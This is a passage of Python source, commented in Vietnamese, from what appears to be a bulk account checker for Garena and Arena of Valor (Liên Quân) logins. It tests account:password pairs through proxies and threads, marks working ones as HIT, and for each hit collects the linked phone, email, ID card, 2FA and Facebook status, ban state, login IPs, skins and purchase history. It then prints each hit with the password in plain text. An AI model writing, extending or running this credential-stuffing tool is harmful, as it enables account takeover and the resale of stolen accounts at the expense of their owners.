                result['_sale_redirect'] = sale_redirect[:120]
            region = result.get("region", "VN") or "VN"
            kt = {}
            if aov_token:
                _futs['weekly']   = _pool.submit(_fetch_weekly_profile, aov_token, proxy)
                _futs['aov_info'] = _pool.submit(_fetch_aov_user_info, aov_token, region, proxy)
                # Camp API: rankJobName + rankGradeStar (capture đúng số sao)
                _futs['kgcamp'] = _pool.submit(
                    _fetch_kgcamp_rank, aov_token, aov_open_id, proxy,
                    (result.get('sso_key') or ''),
                    str(result.get('uid') or ''),
                )
                # _fetch_kientuong_player uses sock for TCP then does HTTP internally
                kt = _fetch_kientuong_player(sock, session_key, proxy=proxy)
            if sale_redirect:
                _futs['skins'] = _pool.submit(_fetch_sale_skins, sale_redirect, proxy)

            # CMD 291/337: GXX hiện result=2/timeout — chỉ chạy khi debug (tiết kiệm bulk)
            if debug:
                full = _fetch_user_full(sock, uid, session_key)
                result["_tcp_full"] = {
                    "result": full.get("_result"),
                    "ok": bool(full.get("_ok")),
                    "error": full.get("_error"),
                    "extra": full.get("extra"),
                }
                gpp = _fetch_gpp_info(sock, session_key, LIEN_QUAN_APP_ID)
                result["_tcp_gpp"] = {
                    "result": gpp.get("_result"),
                    "ok": bool(gpp.get("_ok")),
                    "echo_only": bool(gpp.get("echo_only")),
                    "error": gpp.get("_error"),
                    "fields": gpp.get("fields"),
                }

            # ── Phase 2: Collect all HTTP results (already running in background) ──
            _hr = {}
            for _k, _f in _futs.items():
                try:
                    # skins/uac/napthe/kgcamp đôi khi chậm hơn weekly/aov_info
                    _t = 22 if _k in ('skins', 'uac', 'napthe', 'kgcamp') else 12
                    _hr[_k] = _f.result(timeout=_t)
                except Exception:
                    _hr[_k] = {} if _k != 'recent_games' else []

            # stash kg-camp payload (apply rank SAU weekly/kientuong để không bị đè)
            kg = _hr.get('kgcamp') or {}
            if isinstance(kg, dict) and (kg.get('rank') or kg.get('rank_stars') or kg.get('role_job')):
                result['_kgcamp_rank'] = {
                    k: kg.get(k) for k in (
                        'rank', 'rank_stars', 'role_job', 'role_job_icon', 'name', '_api',
                    ) if kg.get(k) not in (None, '')
                }
                if kg.get('name') and not result.get('aov_name'):
                    result['aov_name'] = kg.get('name')
            # rank mùa + vinh danh (season/detail)
            season = (kg or {}).get('_season') if isinstance(kg, dict) else {}
            if isinstance(season, dict) and season:
                result['_kgcamp_season'] = season

            # Recent games (GameApp)
            rg = _hr.get('recent_games') or []
            if isinstance(rg, list) and rg:
                result['recent_games'] = rg
                result['recent_game_names'] = [
                    str(x.get('name') or '').strip()
                    for x in rg if isinstance(x, dict) and (x.get('name') or '').strip()
                ]

            # Last-chance security fetch (fresh session + more retries)
            # Chạy lại nếu fail HOẶC profile trống bất thường (không phone/email/pass/fb)
            _need_sec_retry = (not result.get('_acct_sec_ok')) or (
                result.get('_acct_sec_ok')
                and not _truthy_mask(result.get('masked_phone'))
                and not _truthy_mask(result.get('masked_email'))
                and not result.get('password_set')
                and not result.get('fb_linked')
                and not result.get('authenticator_enable')
            )
            if _need_sec_retry:
                _invalidate_http_session(proxy)
                if not sso_key:
                    sso = _fetch_sso_key_with_retry(sock, session_key, retries=2)
                    sso_key = (sso.get('sso_key', '') or '').strip()
                    if sso_key:
                        result['sso_key'] = sso_key
                if not session_token:
                    sess_tok = _fetch_session_token(sock, session_key)
                    session_token = (sess_tok.get('session_token', '') or '').strip()
                    if session_token:
                        result['session_token'] = session_token
                alt_keys = [session_token] if session_token else []
                if result.get('sso_key') and result['sso_key'] not in alt_keys:
                    alt_keys.append(result['sso_key'])
                acct_sec = _fetch_account_security(
                    sso_key, proxy, retries=3, account=account, password=password,
                    alt_keys=alt_keys,
                )
                _apply_acct_sec(result, acct_sec)
                if acct_sec:
                    result['_acct_sec_ok'] = True

            # Last-chance skins: retry nếu có redirect/token nhưng skins rỗng
            skins = _hr.get('skins') or {}
            if (not skins or not skins.get('_skins_ok')) and (sale_redirect or aov_token):
                try:
                    if not sale_redirect:
                        sale_redirect = _get_app_redirect_url_retry(sock, session_key)
                    if sale_redirect:
                        _invalidate_http_session(proxy)
                        skins2 = _fetch_sale_skins(sale_redirect, proxy)
                        if skins2 and (
                            skins2.get('_skins_ok')
                            or skins2.get('total_skins') is not None
                            or skins2.get('sale_user_id') is not None
                        ):
                            skins = skins2
                            _hr['skins'] = skins2
                except Exception:
                    pass

            # Last-chance weekly/aov_info
            if aov_token:
                if not (_hr.get('weekly') or {}).get('name') and not result.get('aov_name'):
                    try:
                        w2 = _fetch_weekly_profile(aov_token, proxy)
                        if w2:
                            _hr['weekly'] = w2
                    except Exception:
                        pass
                if not _hr.get('aov_info'):
                    try:
                        ai2 = _fetch_aov_user_info(aov_token, region, proxy)
                        if ai2:
                            _hr['aov_info'] = ai2
                    except Exception:
                        pass

            # Incomplete khi account.garena.com fail (Email/SĐT/CCCD/2FA không tin cậy).
            # Login HIT KHÔNG bị demote → ERROR; chỉ gắn flag recheck/merge.
            _sec_ok = bool(result.get('_acct_sec_ok'))
            _no_token = not (result.get('sso_key') or result.get('session_token'))
            result['_info_fetch_incomplete'] = bool(not _sec_ok)
            if not _sec_ok and _no_token:
                result['_fetch_blocked'] = result.get('_fetch_blocked') or 'missing_sso_or_session_token'
            elif not _sec_ok:
                result['_fetch_blocked'] = result.get('_fetch_blocked') or 'account_security_fail'
            # skin fetch fail có aov token → flag riêng (không force recheck proxy nếu sec OK)
            if aov_token and not (skins or {}).get('_skins_ok') and not (skins or {}).get('total_skins'):
                result['_skins_fetch_incomplete'] = True
            result['_needs_proxy_recheck'] = _needs_info_recheck(result)
            result['_fetch_incomplete'] = bool(result.get('_info_fetch_incomplete'))
            # status sticky HIT
            result['status'] = 'HIT'

            # Chuẩn hoá last-login (sau khi merge TCP + account/init)
            _finalize_hit_meta(result)

            cc = (result.get('country_code') or "").strip()
            if not cc:
                mp = (result.get("masked_phone") or "").strip()
                mcc = re.match(r"^\+(\d{1,4})\b", mp)
                if mcc:
                    cc = mcc.group(1)
                    result["country_code"] = cc

            # UAC (shop.sg) — chỉ bổ sung acc_country khi API chưa có; không ép đè MCC/SĐT
            uac_country = _hr.get('uac') or ""
            if uac_country and not (result.get("acc_country") or "").strip():
                result["acc_country"] = uac_country

            country_from_init = ""
            try:
                _ci = result.get("country")
                if isinstance(_ci, str) and _ci.strip():
                    country_from_init = _ci.strip()
            except Exception:
                pass

            acc_raw = (result.get("acc_country") or "").strip()
            # Ưu tiên: MCC (country_code / SĐT) → acc_country → tên country (account init) → UAC → region
            _country_candidates = [cc, acc_raw, country_from_init, uac_country,
                                   (result.get('region', '') or '').strip().upper()]
            _resolved = "UNKNOWN"
            for _raw in _country_candidates:
                if not _raw:
                    continue
                _n = _normalize_country(_raw)
                if _n and _n != "UNKNOWN":
                    _resolved = _n
                    break
            result["country"] = _resolved

            # ── Liên Quân (AOV) skin check — merge non-destructive ──
            skins = _hr.get('skins') or skins or {}
            if skins:
                result['aov_skins'] = _merge_skins_prefer(result.get('aov_skins'), skins)
                if skins.get('item_history'):
                    result['aov_item_history'] = skins['item_history']
                if skins.get('mailbox'):
                    result['aov_mailbox'] = skins['mailbox']
                if skins.get('sale_user_id') is not None:
                    result['aov_sale_user_id'] = skins.get('sale_user_id')
                if skins.get('user_packs'):
                    result['user_packs'] = skins.get('user_packs')
                if skins.get('shopItems') is not None:
                    result['sale_shop_items'] = skins.get('shopItems')
                if skins.get('boxItems') is not None:
                    result['sale_box_items'] = skins.get('boxItems')
                # sale name fallback for LQ nick
                if skins.get('sale_name') and not result.get('aov_name'):
                    result['aov_name'] = skins.get('sale_name')
                try:
                    disc = extra_dump_and_search(
                        "sale_skins", skins,
                        known_fields={"total_skins", "total_champs", "cp", "ss", "sss", "anime", "other"},
                        meta={"acc": account},
                    )
                    if disc.get("extra_keys"):
                        result.setdefault("_extra_discovered", {}).update(disc["extra_keys"])
                        apply_extra_discovered_fields(result, disc["extra_keys"])
                except Exception:
                    pass

            weekly = _hr.get('weekly') or {}
            if weekly:
                if weekly.get('name'):
                    result['aov_name'] = _prefer_str_field(result.get('aov_name'), weekly.get('name', ''))
                if weekly.get('head_pic') and not result.get('aov_head_pic'):
                    result['aov_head_pic'] = weekly.get('head_pic')
                if weekly.get('player_uid') and not result.get('aov_player_uid'):
                    result['aov_player_uid'] = weekly.get('player_uid')
                if weekly.get('rank') or weekly.get('rank_id') is not None:
                    _apply_rank_to_result(
                        result,
                        rank_name=weekly.get('rank', '') or '',
                        rank_id=weekly.get('rank_id'),
                        rank_stars=int(weekly.get('rank_stars') or 0),
                        rank_entry=weekly.get('rank_entry') or {},
                        source='weekly',
                    )
                try:
                    disc = extra_dump_and_search("weekly_profile", weekly, meta={"acc": account})
                    if disc.get("extra_keys"):
                        result.setdefault("_extra_discovered", {}).update(disc["extra_keys"])
                        apply_extra_discovered_fields(result, disc["extra_keys"])
                except Exception:
                    pass

            if kt:
                if kt.get('level') is not None:
                    try:
                        lv = int(kt.get('level') or 0)
                        if lv and (not result.get('aov_level') or lv > int(result.get('aov_level') or 0)):
                            result['aov_level'] = lv
                    except Exception:
                        result['aov_level'] = kt.get('level', 0)
                if kt.get('register_time'):
                    result['aov_reg_time'] = kt.get('register_time', '')
                result['aov_banned'] = 'YES' if _is_yes(kt.get('banned', 'NO')) else 'NO'
                if kt.get('player_status'):
                    result['aov_player_status'] = kt.get('player_status')
                if kt.get('credit') is not None:
                    try:
                        result['aov_credit'] = int(kt.get('credit'))
                    except Exception:
                        pass
                if kt.get('name') and not result.get('aov_name'):
                    result['aov_name'] = kt.get('name')
                try:
                    kt_stars = int(kt.get('rank_stars') or 0)
                except Exception:
                    kt_stars = 0
                if not kt_stars and isinstance(kt.get('_raw_player'), dict):
                    kt_stars = _deep_pick_rank_stars(kt.get('_raw_player'))
                kt_rank = (kt.get('rank') or '').strip()
                if not kt_rank and isinstance(kt.get('_raw_player'), dict):
                    kt_rank = _deep_pick_rank_name(kt.get('_raw_player'))
                cur_stars = 0
                try:
                    cur_stars = int(result.get('aov_rank_stars') or 0)
                except Exception:
                    cur_stars = 0
                # Ưu tiên sao > 0; nếu weekly đã có sao thì chỉ bổ sung name khi thiếu
                if kt_stars > cur_stars or (kt_rank and not result.get('aov_rank')):
                    _apply_rank_to_result(
                        result,
                        rank_name=kt_rank or result.get('aov_rank') or '',
                        rank_stars=max(kt_stars, cur_stars),
                        source='kientuong' if kt_stars >= cur_stars else (result.get('aov_rank_source') or 'kientuong'),
                    )
                result['_kt_player'] = kt.get('_raw_player', {})

            aov_info = _hr.get('aov_info') or {}
            if aov_info:
                result["aov_user_info"] = aov_info
                try:
                    if isinstance(aov_info, dict):
                        prefill = (
                            ((aov_info.get("data") or {}).get("prefill_mobile") or "")
                            or (aov_info.get("prefill_mobile") or "")
                        ).strip()
                        if prefill and _truthy_mask(prefill):
                            result["aov_prefill_mobile"] = prefill
                            if not _truthy_mask(result.get("masked_phone")):
                                result["masked_phone"] = prefill
                            result["mobile_bound"] = True
                        if result.get("aov_credit") is None:
                            _c2 = _pick_credit_score(aov_info.get("data"), aov_info)
                            if _c2 is not None:
                                result["aov_credit"] = _c2
                except Exception:
                    pass

            # ── kg-camp rank CUỐI CÙNG (ưu tiên tuyệt đối: rankGradeStar + roleJobName) ──
            kg = result.get('_kgcamp_rank') or _hr.get('kgcamp') or {}
            if isinstance(kg, dict) and (kg.get('rank') or kg.get('rank_stars') or kg.get('role_job')):
                try:
                    kg_stars = int(kg.get('rank_stars') or 0)
                except Exception:
                    kg_stars = 0
                kg_rank = (kg.get('rank') or '').strip()
                if not kg_rank and kg.get('role_job'):
                    try:
                        kg_rank = _AOV_ROLEJOB_NAME.get(int(kg.get('role_job')), '')
                    except Exception:
                        kg_rank = ''
                if kg_rank or kg_stars > 0:
                    _apply_rank_to_result(
                        result,
                        rank_name=kg_rank or result.get('aov_rank') or '',
                        rank_id=kg.get('role_job'),
                        rank_stars=kg_stars if kg_stars > 0 else int(result.get('aov_rank_stars') or 0),
                        source='kgcamp',
                    )

            # Final binding inference (sau mọi nguồn: init / napthe / aov / tcp)
            if _truthy_mask(result.get("masked_phone")) or _truthy_mask(result.get("aov_prefill_mobile")):
                result["mobile_bound"] = True
            if int(result.get("email_v") or 0) > 0:
                result["email_verified"] = True
            if _truthy_mask(result.get("masked_email")) and int(result.get("email_v") or 0) > 0:
                result["email_verified"] = True
            # FB UUID: gộp lần cuối (TCP 276/467 + account/init)
            _finalize_fb_fields(result)
          except Exception as _info_exc:
            # Không nuốt HIT: login OK nhưng fetch info lỗi (vd WinError/Errno 22 fromtimestamp)
            result["_info_fetch_error"] = str(_info_exc)
            result["_info_fetch_incomplete"] = True
            result["_needs_proxy_recheck"] = True
            if debug:
                result.setdefault("debug", {})["info_fetch_exc"] = repr(_info_exc)

        # Final normalize rank string → luôn 'T.Anh IV 2 sao' khi có sao
        try:
            if result.get("aov_rank") or result.get("aov_rank_stars"):
                _apply_rank_to_result(
                    result,
                    rank_name=result.get("aov_rank") or "",
                    rank_stars=int(result.get("aov_rank_stars") or 0),
                )
        except Exception:
            pass
        # Đảm bảo fb_uid luôn chuẩn trước return HIT
        if result.get("status") == "HIT":
            try:
                _finalize_fb_fields(result)
            except Exception:
                pass

        return result

    except socket.timeout:
        timed_out_ip = _HOST_IP
        with _HOST_IP_lock:
            _HOST_IP = None
        out = {
            "account": account,
            "password": password,
            "status": "TIMEOUT",
            "detail": f"Socket timeout to {HOST}:{PORT} (ip={timed_out_ip or 'unknown'})",
        }
        if debug:
            out["debug"] = dbg
        return out
    except Exception as exc:
        out = {"account": account, "password": password, "status": "ERROR", "detail": str(exc)}
        if debug:
            out["debug"] = dbg
        return out
    finally:
        # Cleanup socket
        if sock:
            try: sock.close()
            except Exception: pass
        # Release semaphore - critical to prevent deadlocks
        try:
            _conn_sem.release()  # tra lai slot cho thread khac
        except Exception:
            # Semaphore release should never fail, but just in case
            pass

# ── Pretty printer ────────────────────────────────────────────────────────────
def _print_hit_box(r: dict):
    """Print full HIT box — mọi field quan trọng, plain text không color/symbol."""
    if not isinstance(r, dict):
        return
    sk = r.get('aov_skins') if isinstance(r.get('aov_skins'), dict) else {}

    def row(label: str, value: str, color=None):
        if value is None:
            value = ""
        print(f"  {label:<18}{str(value)}")

    acc = r.get('account', '')
    pw  = r.get('password', '')
    row("Account",  f"{acc}:{pw}")
    row("UID",      str(r.get('uid', '') or ''))
    if r.get('username'):
        row("Username",  str(r.get('username')))
    if r.get('nickname'):
        row("Nickname",  str(r['nickname']))
    if r.get('aov_name'):
        row("LQ Name",   str(r['aov_name']))

    ctry = (r.get('country') or r.get('acc_country') or r.get('country_code') or '').strip()
    reg  = (r.get('region')  or '').strip()
    if ctry and ctry != "UNKNOWN":
        row("Country",  ctry)
    if reg:
        row("Region",   reg)

    # Get best available phone
    _full_phone = (r.get('aov_prefill_mobile') or '').strip()
    _show_phone = _full_phone or (r.get('masked_phone') or '').strip()
    
    mob_str = f"YES [{_show_phone}]" if _show_phone else ("YES" if r.get('mobile_bound') else "NO")
    masked_email = (r.get('masked_email') or '').strip()
    mail_str = f"YES [{masked_email}]" if masked_email else ("YES" if r.get('email_verified') or r.get('email_v') else "NO")
    _fb_uid = (r.get('fb_uid') or r.get('fb_uid_login') or '').strip()
    fb_str   = f"YES [{_fb_uid}]" if ((r.get('fb_linked') or _fb_uid) and _fb_uid) else ("YES" if r.get('fb_linked') else "NO")
    idc = (r.get('idcard') or '').strip()
    cccd_str = f"YES [{idc}]" if idc.replace('*', '') else "NO"
    auth_str = "YES" if (r.get('authenticator_enable') or r.get('two_step_verify')) else "NO"
    pass_str = "YES" if r.get('password_set') else "NO"
    ban_raw  = r.get('aov_banned', 'NO')
    ban_str  = "BAN" if _is_yes(ban_raw) else "OK"
    print(f"  Security          SĐT:{mob_str}  Mail:{mail_str}  FB:{fb_str}")
    print(f"                    CCCD:{cccd_str}  2FA:{auth_str}  Pass:{pass_str}  BAN:{ban_str}")

    # Sò luôn hiện (kể cả 0)
    try:
        shells = int(r.get('shells', 0) or 0)
    except Exception:
        shells = 0
    row("Sò", str(shells))

    _sess_ip  = (r.get('last_session_ip') or '').strip()
    _sess_cc  = (r.get('last_session_country') or '').strip()
    _sess_dt  = (r.get('last_session_time') or '').strip()
    if _sess_ip:
        _sess_str = f"{_sess_ip} [{_sess_cc}]"
        if _sess_dt:
            _sess_str += f"  {_sess_dt}"
        row("IP Garena", _sess_str)
    if r.get('init_ip'):
        row("Init IP", str(r.get('init_ip')))

    aov_rank = r.get('aov_rank', '') or ''
    aov_lv   = r.get('aov_level', 0)
    aov_reg  = r.get('aov_reg_time', '')
    aov_server = r.get('aov_server', '')
    if aov_server:
        row("Server", aov_server)
    if r.get('aov_server_id') not in (None, '', 0, '0'):
        row("Server ID", str(r.get('aov_server_id')))
    if aov_rank or r.get('aov_rank_stars'):
        rank_base = _rank_base_name(aov_rank) or (aov_rank or "").strip()
        try:
            stars_show = int(r.get('aov_rank_stars') or 0)
        except Exception:
            stars_show = 0
        if not stars_show and aov_rank:
            stars_show = _extract_master_stars(aov_rank) or 0
        rank_display = f"{rank_base} ({stars_show} sao)" if stars_show > 0 else (rank_base or "Unranked")
        row("Rank", rank_display)

    # ── Rank mùa + Vinh danh (season/detail) ──
    _season = r.get('_kgcamp_season') or {}
    if isinstance(_season, dict) and _season:
        _sr = (_season.get('season_rank') or '').strip()
        _ss = int(_season.get('season_stars') or 0)
        if _sr:
            _s_seg = f"{_sr} ({_ss} sao)" if _ss else _sr
            row("Rank cao nhất", _s_seg)
        _swr = _season.get('season_winrate')
        if _swr is not None:
            row("Tỉ lệ thắng", f"{_swr}%")
        _sb = int(_season.get('season_battles') or 0)
        _sw = int(_season.get('season_wins') or 0)
        _sm = int(_season.get('season_mvp') or 0)
        if _sb or _sw or _sm:
            row("Vinh danh", f"{_sw}W / {_sb} trận / {_sm} MVP")
        _heroes = _season.get('top_heroes') or []
        if _heroes:
            _parts = []
            for h in _heroes[:6]:
                if isinstance(h, dict) and h.get('hero_id') is not None:
                    hid = h.get('hero_id')
                    hname = get_hero_name(hid) or str(hid)
                    wr = h.get('win_rate', 0)
                    bt = h.get('battles', 0)
                    _parts.append(f"{hname} ({wr}% {bt} trận)")
            if _parts:
                row("Tướng tủ", ', '.join(_parts))
        _sl = _season.get('_season_list') or []
        if _sl:
            _s0 = _sl[0] if isinstance(_sl[0], dict) else {}
            _yr = _s0.get('season_year')
            _idx = _s0.get('season_year_index')
            if _yr:
                row("Mùa", f"S{_yr} ({_idx})" if _idx is not None else f"S{_yr}")
    if aov_lv:
        row("Level",    str(aov_lv))
    if aov_reg:
        row("Ngày đăng ký", aov_reg)
    if r.get('is_garena_verified') is not None or r.get('garena_verified') is not None:
        gv = r.get('is_garena_verified') if r.get('is_garena_verified') is not None else r.get('garena_verified')
        row("Garena Verified", 'YES' if gv else 'NO')

    # recent_games: list hoặc {'games':[...]}
    rg_names = r.get('recent_game_names') or []
    if not rg_names:
        rg = r.get('recent_games')
        items = []
        if isinstance(rg, list):
            items = rg
        elif isinstance(rg, dict):
            items = rg.get('games') or rg.get('list') or []
        if isinstance(items, list):
            rg_names = [
                str(x.get('name') or '').strip()
                for x in items
                if isinstance(x, dict) and (x.get('name') or '').strip()
            ]
    if rg_names:
        shown = ', '.join(str(x) for x in rg_names[:8])
        if len(rg_names) > 8:
            shown += f' (+{len(rg_names)-8})'
        row("Game gần đây", shown)

    # Ban details
    ban_raw = r.get('aov_banned', 'NO')
    if _is_yes(ban_raw):
        kt_player = r.get('_kt_player') or {}
        ban_info  = kt_player.get('banInfo') or {}
        unban_ts  = ban_info.get('unbanTime', 0)
        until = _norm_unix_ts(unban_ts)
        if until:
            try:
                unban_str = _safe_fromtimestamp(until, '%d/%m/%Y %H:%M')
                row("BAN đến", unban_str)
            except Exception:
                pass
        ban_reason = (ban_info.get('reason') or '').strip()
        if ban_reason:
            row("Lý do BAN", ban_reason)

    # Điểm uy tín trong game (0-100)
    _credit = r.get('aov_credit')
    if _credit is not None:
        try:
            _credit = int(_credit)
        except Exception:
            _credit = None
        if _credit is not None:
            _src = r.get("aov_credit_source") or ""
            _lbl = f"{_credit}/100"
            if _src:
                _lbl += f"  ({_src})"
            row("Điểm uy tín", _lbl)

    # Uy tín (reputation score + level)
    _uy = r.get('uy_tin') or {}
    if isinstance(_uy, dict) and _uy.get('score') is not None:
        _lvl = _uy.get('level') or ''
        try:
            _score = int(_uy.get('score') or 0)
        except Exception:
            _score = 0
        row("Uy tín", f"{_score}/100  {_lvl}")
    # Bảng Phong Thần (vi phạm ≥3 tháng)
    _pt = r.get('phongthan') or []
    if isinstance(_pt, list) and _pt:
        _pt_str = ' | '.join(
            f"{x.get('charName')} ({x.get('reason_name')} {x.get('endDate')})"
            for x in _pt[:4] if isinstance(x, dict)
        )
        if _pt_str:
            row("Phong Thần", _pt_str)
    # Sale item history
    item_history = r.get('aov_item_history') or []
    if item_history:
        recent = item_history[:5]
        hist_parts = []
        for it in recent:
            ts = (it.get('createdAt') or '')[:10]
            extra = (it.get('extra') or it.get('source') or '?')[:20]
            cost = it.get('costStr') or ''
            hist_parts.append(f"{ts} {extra}({cost})" if cost else f"{ts} {extra}")
        row("Lịch sử mua", ' | '.join(hist_parts))

    total_sk   = sk.get('total_skins', 0) or 0
    total_chmp = sk.get('total_champs', 0) or 0
    cp         = sk.get('cp', 0) or 0
    row("Skin/Champ", f"{total_sk} skins / {total_chmp} champs  QH={cp}")

    tier_meta = (
        ('sss', 'SSS'),
        ('ss', 'SS'),
        ('anime', 'Anime'),
        ('huuhan', 'Hữu Hạn'),
        ('ssm', 'SSM'),
        ('tuyetsac', 'Tuyệt Sắc'),
        ('chuyensac', 'Chuyển Sắc'),
        ('evo', 'EVO'),
        ('s_plus', 'S+'),
        ('s', 'S'),
        ('a', 'A'),
        ('special', 'Special'),
    )
    for tier_key, label in tier_meta:
        cnt = sk.get(tier_key, 0) or 0
        if cnt:
            if tier_key in ('a', 's', 's_plus', 'ssm'):
                row(f"{label}({cnt})", "")
            else:
                names = ', '.join(str(x) for x in (sk.get(f'{tier_key}_list') or [])[:6])
                row(f"{label}({cnt})", names)

    # ── Security signals ──
    try:
        suspicious = int(r.get('suspicious', 0) or 0)
    except Exception:
        suspicious = 0
    if suspicious:
        row("!! Suspicious", str(suspicious))
    if r.get('whitelistable') is not None:
        row("Whitelistable", "YES" if r.get('whitelistable') else "NO")
    sig = (r.get('signature') or '').strip()
    if sig:
        row("Bio", sig)
    if r.get('fb_link_time'):
        row("FB Linked", str(r.get('fb_link_time')))
    if r.get('aov_player_status') and r.get('aov_player_status') not in ('NO_DELETION_REQUEST',):
        row("LQ Status", str(r.get('aov_player_status')))

    garena_created = r.get('garena_created', '')
    # Ẩn epoch 1970 rác
    if garena_created and "1970" not in str(garena_created) and "1969" not in str(garena_created):
        row("Tạo GR",   garena_created)

    # Đăng nhập chuẩn: login_history / last_session (không dùng TCP last_login cũ)
    ll_disp = (r.get('last_login_best') or '').strip()
    if not ll_disp:
        try:
            _finalize_hit_meta(r)
        except Exception:
            pass
        ll_disp = (r.get('last_login_best') or '').strip()
    if not ll_disp:
        ll_disp = _fmt_last_login(r.get('last_login', '') or r.get('last_session_time', ''))
    if ll_disp and ll_disp != 'N/A':
        row("Đăng nhập", ll_disp)

    # Lịch sử login / ops
    _lhist = r.get('login_history') or []
    if isinstance(_lhist, list) and _lhist:
        parts = []
        seen_hist = set()
        for h in _lhist:
            if not isinstance(h, dict):
                continue
            t = h.get('time', '')
            g = h.get('game', '')
            ip = h.get('ip', '')
            cc = h.get('country', '')
            item_str = f"{t} {g} {ip} [{cc}]".strip()
            if not item_str or item_str in seen_hist:
                continue
            seen_hist.add(item_str)
            parts.append(item_str)
            if len(parts) >= 5:
                break
        if parts:
            row("Login hist", " | ".join(parts))

    _sops = r.get('sensitive_ops') or []
    if isinstance(_sops, list) and _sops:
        parts = []
        seen_ops = set()
        for op in _sops:
            if not isinstance(op, dict):
                continue
            op_str = f"{op.get('type','')} {op.get('time','')} {op.get('ip','')}".strip()
            if not op_str or op_str in seen_ops:
                continue
            seen_ops.add(op_str)
            parts.append(op_str)
            if len(parts) >= 5:
                break
        if parts:
            row("Sec ops", " | ".join(parts))

    tinh_trang = _derive_tinh_trang(r)
    row("Tình Trạng", tinh_trang)
    print()


def _print_hit_raw_full(r: dict) -> None:
    pass


def _print_hit_verbose_details(r: dict) -> None:
    pass


def _print_result(r: dict, verbose: bool = False, stats: dict = None, force_box: bool = False):
    status = r["status"]
    acc    = r['account']
    pw     = r['password']

    # Build live stats suffix
    stat_str = ""
    if stats is not None:
        done  = stats.get('done', 0)
        total = stats.get('total', 0)
        hits  = stats.get('hits', 0)
        inv   = stats.get('invalid', 0)
        err   = stats.get('error', 0)
        pct   = f"{done*100//total}%" if total else "0%"
        stat_str = _c(C.GRAY, f" [{done}/{total} {pct}  ") + \
                   _c(C.GREEN, f"HIT:{hits}") + _c(C.GRAY, " ") + \
                   _c(C.RED, f"DIE:{inv}") + _c(C.GRAY, " ") + \
                   _c(C.YELLOW, f"ERR:{err}") + _c(C.GRAY, "]")

    if status == "HIT":
        is_vn = _is_vietnam_result(r)
        # Bulk: non-VN im lặng. Single-check luôn hiện box.
        if not is_vn and stats is not None and not force_box and not verbose:
            return
        if not is_vn:
            print(_c(C.YELLOW, f"\n  ⚠ HIT non-VN (country={r.get('country') or '?'})"))

        # 1) Bảng HIT đầy đủ
        try:
            _print_hit_box(r)
        except Exception as exc:
            print(_c(C.RED, f"  [HIT box error] {exc}"))
            print(f"  HIT {acc}:{pw} uid={r.get('uid')}")
    elif status == "INVALID":
        print(_c(C.RED, f"\n ✘ [DIE]") + _c(C.GRAY, f" {acc}:{pw}") + stat_str)
    elif status == "TIMEOUT":
        print(_c(C.YELLOW, f"\n ⏱ [TIMEOUT]") + _c(C.GRAY, f" {acc}") + stat_str)
    elif status == "MISS":
        # Lọc bỏ MISS result=101/105/174 (tài khoản không phải Garena) — không in
        detail = r.get('detail', '')
        skip_codes = ('result=101', 'result=105', 'result=174')
        if any(c in detail for c in skip_codes):
            return  # im lặng, không in
        print(_c(C.GRAY, f"\n ! [MISS]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)
    else:
        detail = r.get('detail', '')
        print(_c(C.YELLOW, f"\n ! [{status}]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)

def _print_bulk_status(stats: dict, started_at: float):
    """Single-line bulk progress to avoid log spam."""
    done  = stats.get('done', 0)
    total = stats.get('total', 0)
    hits  = stats.get('hits', 0)
    inv   = stats.get('invalid', 0)
    err   = stats.get('error', 0)
    white_hits = stats.get('white_hits', 0)
    white_shells = stats.get('white_shells', 0)
    pct   = f"{done*100//total}%" if total else "0%"
    elapsed = max(1.0, time.time() - started_at)
    cpm = int(done / elapsed * 60)
    line = (
        f"[{done}/{total}] {pct} | CPM:{cpm} | HIT:{hits} | DIE:{inv} | ERR:{err} | "
        f"WHITE:{white_hits} | SO_WHITE:{white_shells}"
    )
    sys.stdout.write(f"\r\033[K{line}")
    sys.stdout.flush()


def _compute_bulk_threads(requested: int) -> int:
    """Cap worker count to what sockets/proxies can sustain stably."""
    requested = max(1, int(requested or 1))
    if _proxy_list:
        proxy_cap = max(16, len(_proxy_list) * 4)
        return max(1, min(requested, max(_MAX_CONN, proxy_cap), _MAX_CONN * 2))
    return max(1, min(requested, _DIRECT_MAX_WORKERS))

# ── Helpers ────────────────────────────────────────────────────────────────────
def _parse_dt_any(value) -> "_dt.datetime | None":
    """Parse unix ts / common datetime strings → naive local datetime."""
    if value is None or value == "":
        return None
    if isinstance(value, _dt.datetime):
        dt = value.replace(tzinfo=None) if value.tzinfo else value
        return dt if dt.year >= 2000 else None
    # unix seconds / ms
    if isinstance(value, (int, float)) or (isinstance(value, str) and value.strip().lstrip("-").isdigit()):
        ts = _norm_unix_ts(value)
        if ts <= 0 or ts < 946_684_800:
            return None
        try:
            return _dt.datetime.fromtimestamp(ts)
        except Exception:
            return None
    s = str(value).strip()
    for fmt in (
        "%Y-%m-%d %H:%M:%S",
        "%d-%m-%Y %H:%M",
        "%d-%m-%Y %H:%M:%S",
        "%d/%m/%Y %H:%M",
        "%d/%m/%Y %H:%M:%S",
        "%H:%M:%S %d/%m/%Y",
        "%H:%M:%S %d-%m-%Y",
        "%H:%M %d-%m-%Y",
        "%Y-%m-%dT%H:%M:%S",
    ):
        try:
            dt = _dt.datetime.strptime(s, fmt)
            if dt.year < 2000:
                return None
            return dt
        except Exception:
            continue
    return None


def _fmt_last_login(ts_str: str) -> str:
    """Format last login as relative date like 'Hôm Nay (HH:MM:SS dd/mm/yyyy)'."""
    if not ts_str:
        return "N/A"
    dt = _parse_dt_any(ts_str)
    if not dt:
        return str(ts_str)
    if dt.year < 2010:
        return "Chưa từng đăng nhập"
    return _fmt_relative_dt(dt)


def _fmt_relative_dt(dt: _dt.datetime, now: _dt.datetime = None) -> str:
    if dt is None:
        return ""
    try:
        if dt.year < 2000:
            return ""
    except Exception:
        return ""
    """Relative Vietnamese label + absolute clock."""
    now = now or _dt.datetime.now()
    if dt.year < 2010:
        return "Chưa từng đăng nhập"
    time_part = dt.strftime("%H:%M:%S %d/%m/%Y")
    try:
        delta_sec = int((now - dt).total_seconds())
    except Exception:
        return time_part
    if delta_sec < 0:
        delta_sec = 0
    if delta_sec < 60:
        return f"Vừa xong ({time_part})"
    if delta_sec < 3600:
        return f"{max(1, delta_sec // 60)} phút trước ({time_part})"
    if dt.date() == now.date():
        h = max(1, delta_sec // 3600)
        return f"Hôm Nay · {h}h trước ({time_part})"
    if dt.date() == (now.date() - _dt.timedelta(days=1)):
        return f"Hôm Qua ({time_part})"
